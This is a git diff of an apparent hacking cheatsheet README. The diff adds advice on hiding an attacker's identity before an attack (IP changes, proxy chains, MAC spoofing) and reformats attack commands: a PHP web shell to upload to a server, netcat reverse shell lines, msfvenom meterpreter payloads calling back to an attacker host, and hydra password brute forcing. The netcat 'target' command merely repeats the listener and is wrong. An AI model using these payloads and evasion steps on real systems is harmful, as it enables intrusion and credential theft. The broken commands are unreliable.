@@ -35,6 +35,14 @@ Resources and cheatsheet collection
 - [Googler [terminal google search]](https://github.com/jarun/googler)
 
 
+--------------------------------
+# BEFORE AN ATTACK
+--------------------------------
+- Change your IP
+- Use a proxy (Chain Proxy)
+- Change your MAC address when running a network-based attack
+
+
 ---------------------------------
 # LINKS
 ---------------------------------
@@ -60,7 +68,10 @@ Resources and cheatsheet collection
 # CHEATSHEET
 ---------------------------------
 
-### 📌Find IP addresses of target
+#### Change MAC address
+`sudo macchanger -r <INTERFACE>`
+
+### Find IP addresses of target
 
 $ host <SITE/IP>
 $ ping <SITE/IP>
@@ -70,33 +81,33 @@ $ nslookup <SITE>`
 
 `$ whois <SITE>`
 
-### 📌 IDENTIFY THE TYPE OF HASH
+#### Find the type of hash
 
-`$ hash-identifier`
+`hash-identifier`
 
-### 📌 FTP Login (with credentials)
+#### FTP Login (with credentials)
 
-`$ ftp <IP>`
+`ftp <IP>`
 
-### 📌 GET LINUX PC INFO
+#### Get linux machine info
 
-`$ uname -a`
+`uname -a`
 
-### 📌 START REVERSE SHELL (netcat)
+### Netcat reverse shell
 
 attacker:
 
-`$ nc -lnvp <PORT> -s <IP>`
+`nc -lnvp <PORT> -s <IP>`
 
 target:
 
-`$ nc -lnvp <PORT> -s <IP>`
+`nc -lnvp <PORT> -s <IP>`
 
-### 📌 EXECUTE COMMANDS IN URL WITH PHP SHELL_EXEC
+#### Execute PHP shell commands in URL
 
 1. create file [anyname.php]
 
-`$ <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`
+`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`
 
 1. upload to server
 2. execute commands by going to:
@@ -105,23 +116,23 @@ http://<IP>/anyname.php?cmd=<COMMAND>
 
 ![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f4b3de9b-cd1e-42f0-b18b-6137415b15ee/Untitled.png)
 
-### 📌 PORT::3389 OPEN (REMOTE SCREEN CONTROL)
+#### PORT::3389 OPEN (REMOTE SCREEN CONTROL)
 
 framework: Crowbar
 
-### 📌 TCP REVERSE SHELL EXPLOIT (Metasploit)
+#### Create metasploit TCP reverse shell payload
 
 standard format:
 
-`$ msfvenom -p <PAYLOAD_PATH> -f <FILE_EXTENSION> -o <FILE_NAME + EXTENSION> LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT>`
+`msfvenom -p <PAYLOAD_PATH> -f <FILE_EXTENSION> -o <FILE_NAME + EXTENSION> LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT>`
 
 windows target:
-`$ msfvenom -p windows/meterpreter/reverse_tcp -f <FILE_EXTENSION> -o <FILE_NAME + EXTENSION> LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT>`
+`msfvenom -p windows/meterpreter/reverse_tcp -f <FILE_EXTENSION> -o <FILE_NAME + EXTENSION> LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT>`
 
 android target:
-`$ msfvenom -p android/meterpreter/reverse_tcp -o app.exe LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT>`
+`msfvenom -p android/meterpreter/reverse_tcp -o app.exe LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT>`
 
-### 📌 GUESS/CRACK/BRUTEFORCE PSWD
+#### Brute-force password
 
 framework: hydra
 
@@ -129,13 +140,13 @@ usage:
 
 `$ hydra --l <NAME> -P <passlist.txt/WORDLIST_PATH> <IP>`
 
-### 📌 SAMBA ENUMERATION
+### SAMBA enumeration
 
 Get information from a Samba system (find usernames)
 
 `$ enum4linux -a <IP>`
 
-### 📌 GET DIECTORIES ON TARGET/WEBSITE
+### List pages on a website/web server
 
 framework: dirb
 
